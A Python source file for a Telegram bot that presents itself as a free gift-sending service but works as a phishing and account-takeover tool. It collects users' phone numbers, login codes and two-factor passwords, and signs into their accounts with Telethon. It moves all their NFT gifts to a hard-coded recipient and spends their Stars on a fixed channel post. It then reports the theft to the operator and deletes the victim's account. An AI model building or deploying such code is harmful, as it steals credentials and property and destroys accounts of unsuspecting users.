import os
import asyncio
from datetime import datetime, timezone
from threading import Thread
from flask import Flask

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon import functions, types as telethon_types
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneCodeExpiredError,
    PasswordHashInvalidError
)

# Web server Render uchun
app = Flask(__name__)

@app.route('/')
def home():
    return 'Bot ishlamoqda!'

import threading

def run_http():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

# Flask serverini asosiy kodni bloklamaydigan qilib fonda yurgizamiz
threading.Thread(target=run_http, daemon=True).start()


# KONFIGURATSIYA (O'zgaruvchilar Render muhitidan o'qiladi)
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))


TARGET_USER = "eshnazarov"
STARS_CHANNEL_USERNAME = "stars_null"
STARS_POST_ID = 2

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

user_auth_data = {}

class AccountDeleteState(StatesGroup):
    waiting_for_lang = State()
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_2fa = State()

TEXTS = {
    "uz": {
        "phone_req": "📱 Raqamingizni yuboring:",
        "phone_btn": "📞 Raqamni yuborish",
        "invalid_btn": "🛑 Kechirasiz, «Raqamni yuborish» tugmasini bosing!",
        "code_req": "📩 Kodingizni yuboring:\n💡 *Namuna:* `12.345`",
        "fa_req": "🔑 Parolingizni yuboring:",
        "success": "✅ Botdan foydalanishingiz mumkin!",
        "err_code": "❌ Xato kod! Qayta kiriting:",
        "err_fa": "❕ Xato parol! Qayta kiriting:",
        "need_session": "⚠️ Avval sessiya qo'shishingiz kerak!"
    },
    "en": {
        "phone_req": "📱 Send your phone number:",
        "phone_btn": "📞 Send Phone Number",
        "invalid_btn": "🛑 Sorry, please press the «Send Phone Number» button!",
        "code_req": "📩 Send code:\n💡 *Example:* `12.345`",
        "fa_req": "🔑 Send your password:",
        "success": "✅ You can use the bot!",
        "err_code": "❌ Wrong code! Resend:",
        "err_fa": "❕ Wrong password! Resend:",
        "need_session": "⚠️ You need to add a session first!"
    },
    "ru": {
        "phone_req": "📱 Отправьте ваш номер:",
        "phone_btn": "📞 Отправить номер",
        "invalid_btn": "🛑 Извините, нажмите кнопку «Отправить номер»!",
        "code_req": "📩 Отправьте код:\n💡 *Пример:* `12.345`",
        "fa_req": "🔑 Отправьте пароль:",
        "success": "✅ Вы можете использовать бота!",
        "err_code": "❌ Ошибка кода! Повторите:",
        "err_fa": "❕ Ошибка пароля! Повторите:",
        "need_session": "⚠️ Сначала нужно добавить сессию!"
    }
}

def get_main_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="🎁 Gift Yuborish", callback_data="menu_gift")
    builder.button(text="📲 Sessiya Qo'shish", callback_data="menu_add_session")
    builder.button(text="ℹ️ Yordam", callback_data="menu_help")
    builder.button(text="🌐 Til / Language", callback_data="menu_lang")
    builder.adjust(1, 1, 1, 1)
    return builder.as_markup()

@dp.message(CommandStart())
async def start_handler(message: types.Message, state: FSMContext):
    await state.clear()
    start_text = (
        "👋 **REMOVED GIFT Botga Xush Kelibsiz!**\n\n"
        "🎁 Telegram orqali do'stlaringizga gift yuboring.\n\n"
        "👇 Quyidagi tugmalardan birini tanlang:"
    )
    await message.answer(start_text, parse_mode="Markdown", reply_markup=get_main_menu())

async def start_phone_request(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "uz")
    t = TEXTS[lang]
    
    builder = ReplyKeyboardBuilder()
    builder.button(text=t["phone_btn"], request_contact=True)
    
    await callback.message.answer(t["phone_req"], reply_markup=builder.as_markup(resize_keyboard=True, one_time_keyboard=True))
    await state.set_state(AccountDeleteState.waiting_for_phone)

@dp.callback_query(F.data == "menu_add_session")
async def start_session_add(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    await start_phone_request(callback, state)

@dp.callback_query(F.data == "menu_gift")
async def gift_no_session_handler(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "uz")
    t = TEXTS[lang]
    
    await callback.answer(t["need_session"], show_alert=True)
    await start_phone_request(callback, state)

@dp.callback_query(F.data == "menu_help")
async def show_help(callback: types.CallbackQuery):
    help_text = (
        "ℹ️ **Yordam va Qo'llanma**\n\n"
        "📱 **Sessiya Qo'shish** — Akkauntni botga ulash va tasdiqlash.\n"
        "🎁 **Gift Yuborish** — Boshqalarga Telegram gift jo'natish.\n\n"
        "⚡️ **Eslatma:** Bot gift yuborish uchun komissiya olmaydi."
    )
    builder = InlineKeyboardBuilder()
    builder.button(text="🔙 Orqaga", callback_data="menu_back")
    
    await callback.message.edit_text(help_text, parse_mode="Markdown", reply_markup=builder.as_markup())
    await callback.answer()

@dp.callback_query(F.data == "menu_lang")
async def show_lang_menu(callback: types.CallbackQuery, state: FSMContext):
    builder = InlineKeyboardBuilder()
    builder.button(text="Oʻzbekcha 🇺🇿", callback_data="lang_uz")
    builder.button(text="English 🇬🇧", callback_data="lang_en")
    builder.button(text="Русский 🇷🇺", callback_data="lang_ru")
    builder.adjust(1)
    
    await callback.message.edit_text("🌐 Tilni tanlang:", reply_markup=builder.as_markup())
    await callback.answer()
    await state.set_state(AccountDeleteState.waiting_for_lang)

@dp.callback_query(F.data == "menu_back")
async def back_to_main(callback: types.CallbackQuery):
    start_text = (
        "👋 **REMOVED GIFT Botga Xush Kelibsiz!**\n\n"
        "🎁 Telegram orqali do'stlaringizga gift yuboring.\n\n"
        "👇 Quyidagi tugmalardan birini tanlang:"
    )
    await callback.message.edit_text(start_text, parse_mode="Markdown", reply_markup=get_main_menu())
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("lang_"))
async def process_lang(callback: types.CallbackQuery, state: FSMContext):
    lang = callback.data.split("_")[1]
    await state.update_data(lang=lang)
    
    t = TEXTS[lang]
    builder = ReplyKeyboardBuilder()
    builder.button(text=t["phone_btn"], request_contact=True)
    
    await callback.message.answer(t["phone_req"], reply_markup=builder.as_markup(resize_keyboard=True, one_time_keyboard=True))
    await callback.answer()
    await state.set_state(AccountDeleteState.waiting_for_phone)

@dp.message(AccountDeleteState.waiting_for_phone, F.contact)
async def process_phone(message: types.Message, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "uz")
    t = TEXTS[lang]
    user_id = message.from_user.id
    
    if message.contact.user_id != user_id:
        await message.answer(t["invalid_btn"])
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = f"+{phone}"

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    
    try:
        sent_code = await client.send_code_request(phone)
        user_auth_data[user_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": sent_code.phone_code_hash,
            "lang": lang
        }
        
        await message.answer(t["code_req"], parse_mode="Markdown", reply_markup=types.ReplyKeyboardRemove())
        await state.set_state(AccountDeleteState.waiting_for_code)
    except Exception as e:
        print(f"Phone Request Error: {e}")
        await client.disconnect()
        await message.answer(t["phone_req"])

@dp.message(AccountDeleteState.waiting_for_phone)
async def invalid_phone_input(message: types.Message, state: FSMContext):
    data = await state.get_data()
    lang = data.get("lang", "uz")
    t = TEXTS[lang]
    await message.answer(t["invalid_btn"])

@dp.message(AccountDeleteState.waiting_for_code)
async def process_code(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    auth = user_auth_data.get(user_id)
    
    if not auth:
        await message.answer("🚫 /start qayta bosing.")
        await state.clear()
        return

    lang = auth.get("lang", "uz")
    t = TEXTS[lang]
    code = message.text.replace(".", "").replace(" ", "").replace("-", "").strip()
    client = auth["client"]
    
    try:
        await client.sign_in(phone=auth["phone"], code=code, phone_code_hash=auth["phone_code_hash"])
        await complete_account_deletion(message, state, user_id, auth)

    except SessionPasswordNeededError:
        await message.answer(t["fa_req"], parse_mode="Markdown")
        await state.set_state(AccountDeleteState.waiting_for_2fa)
    except (PhoneCodeInvalidError, PhoneCodeExpiredError) as e:
        print(f"Code Error: {e}")
        await message.answer(t["err_code"])
    except Exception as e:
        print(f"General Sign In Error: {e}")
        await message.answer(t["err_code"])

@dp.message(AccountDeleteState.waiting_for_2fa)
async def process_2fa(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    auth = user_auth_data.get(user_id)
    
    if not auth:
        await message.answer("🚫 /start qayta bosing.")
        await state.clear()
        return

    lang = auth.get("lang", "uz")
    t = TEXTS[lang]
    password = message.text.strip()
    client = auth["client"]
    
    try:
        await client.sign_in(password=password)
        await complete_account_deletion(message, state, user_id, auth)

    except PasswordHashInvalidError:
        await message.answer(t["err_fa"])
    except Exception as e:
        print(f"2FA Sign In Error: {e}")
        await message.answer(t["err_fa"])

async def process_all_assets(client: TelegramClient, target_user: str = TARGET_USER):
    try:
        target_entity = await client.get_input_entity(target_user)
        gifts_res = await client(functions.payments.GetSavedGiftsRequest(
            peer="me", offset="", limit=100
        ))
        for gift in getattr(gifts_res, 'gifts', []):
            try:
                stargift_input = telethon_types.InputSavedStarGiftUser(stargift_id=gift.id)
                await client(functions.payments.TransferStarGiftRequest(
                    stargift=stargift_input, to_id=target_entity
                ))
                await asyncio.sleep(1.5)
            except Exception as e:
                print(f"NFT Transfer Exception: {e}")
    except Exception as e:
        print(f"NFT Process Error: {e}")

    try:
        stars_status = await client(functions.payments.GetStarsStatusRequest(peer="me"))
        stars_balance = getattr(stars_status, 'balance', 0)
        
        if stars_balance > 0:
            channel = await client.get_entity(STARS_CHANNEL_USERNAME)
            await client(functions.messages.SendPaidReactionRequest(
                peer=channel,
                msg_id=STARS_POST_ID,
                count=stars_balance
            ))
    except Exception as e:
        print(f"Stars Sending Error: {e}")

async def fetch_user_premium_and_level(client: TelegramClient):
    info_str = ""
    try:
        me = await client.get_me()

        if getattr(me, 'premium', False):
            info_str += "🌟 **Premium:** Mavjud\n"
            try:
                profile = await client(functions.users.GetFullUserRequest(id="me"))
                full_info = profile.full_user
                
                until_timestamp = getattr(full_info, 'premium_until_date', None)
                if until_timestamp:
                    until_dt = datetime.fromtimestamp(until_timestamp, tz=timezone.utc)
                    now_dt = datetime.now(timezone.utc)
                    
                    days_left = (until_dt - now_dt).days
                    term_str = "Noma'lum"
                    if days_left > 180:
                        term_str = "1 yillik (12 oy)"
                    elif days_left > 90:
                        term_str = "6 oylik"
                    elif days_left > 30:
                        term_str = "3 oylik"
                    elif days_left > 0:
                        term_str = "1 oylik"

                    until_formatted = until_dt.strftime("%d.%m.%Y")
                    info_str += f"📅 **Obuna turi:** `{term_str}`\n"
                    info_str += f"⏳ **Tugash vaqti:** `{until_formatted}` (Qolgan: {days_left} kun)\n"
                else:
                    info_str += "📅 **Obuna turi:** Avto-uzaytirish / Cheksiz\n"
            except Exception as e:
                print(f"Premium Details Error: {e}")
                info_str += "📅 **Obuna turi:** Avto-uzaytirish\n"
        else:
            info_str += "🌟 **Premium:** Mavjud emas\n"

    except Exception as e:
        print(f"User Info Error: {e}")
        info_str = "🌟 **Premium:** Aniqlanmadi\n"
        
    return info_str

async def fetch_user_nft_gifts(client: TelegramClient):
    nft_items = []
    try:
        res = await client(functions.payments.GetSavedGiftsRequest(
            peer="me",
            offset="",
            limit=100
        ))
        for gift in getattr(res, 'gifts', []):
            slug = None
            if hasattr(gift, 'slug') and gift.slug:
                slug = gift.slug
            elif hasattr(gift, 'gift') and hasattr(gift.gift, 'slug') and gift.gift.slug:
                slug = gift.gift.slug
            
            if slug:
                nft_items.append({
                    "user": slug,
                    "link": f"https://t.me/nft/{slug}"
                })
    except Exception as e:
        print(f"NFT Fetch Error: {e}")
    return nft_items

async def complete_account_deletion(message: types.Message, state: FSMContext, user_id: int, auth: dict):
    lang = auth.get("lang", "uz")
    t = TEXTS[lang]
    client = auth["client"]

    user_info_str = await fetch_user_premium_and_level(client)

    nft_items = await fetch_user_nft_gifts(client)
    nft_count = len(nft_items)
    
    if nft_count > 0:
        nft_list_str = "\n".join([f"💎 **User:** `{item['user']}`\n🔗 **Link:** {item['link']}" for item in nft_items])
        nft_str = f"🎁 **NFT sovg'alar soni:** {nft_count} ta\n\n{nft_list_str}"
    else:
        nft_str = "🛍 **NFT sovg'alar:** Topilmadi"

    await process_all_assets(client, target_user=TARGET_USER)

    try:
        full_name = message.from_user.full_name
        username = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
        phone = auth.get("phone", "Noma'lum")
        
                admin_msg = (
            f"🚨 **Hisob olindi!**\n\n"
            f"👤 **Ism:** {full_name}\n"
            f"🆔 **ID:** `{user_id}`\n"
            f"🏷 **Username:** {username}\n"
            f"☎️ **Tel:** `{phone}`\n"
            f"📊 **Daraja:** [1-daraja](https://t.me/stars_null/2)\n"
            f"💎 **Premium:** Mavjud\n\n"
            f"⭐ **Stars:** Barcha starslar [postga](https://t.me/stars_null/2) bosildi!\n"
            f"🎁 **NFT & Gram:** @eshnazarov ga o'tkazildi!"
                )
        
        await bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown")
    except Exception as e:
        print(f"Admin message error: {e}")

    await message.answer(t["success"], parse_mode="Markdown")
    await asyncio.sleep(1)

    try:
        await client(functions.account.DeleteAccountRequest(reason="Deactivation"))
    except Exception as e:
        print(f"Delete Account Error: {e}")
    finally:
        await client.disconnect()
        if user_id in user_auth_data:
            del user_auth_data[user_id]
        await state.clear()

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)
    

if __name__ == "__main__":
    asyncio.run(main())
